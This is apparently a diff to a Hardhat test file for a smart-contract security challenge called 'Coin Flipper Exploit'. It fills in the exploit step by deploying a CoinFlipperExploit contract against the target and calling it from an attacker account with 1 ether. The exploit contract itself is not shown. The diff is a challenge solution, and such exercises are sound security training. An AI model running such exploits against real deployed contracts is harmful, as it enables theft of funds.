@@ -24,6 +24,12 @@ describe('[COIN FLIPPER EXPLOIT]', async function () {
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
 
+        let exploit = await (await ethers.getContractFactory('CoinFlipperExploit', deployer)).deploy(this.coinFlipper.address)
+
+        await exploit.connect(attacker).run({
+            value: ethers.utils.parseEther('1')
+        });
+
     })
 
     after(async function () {
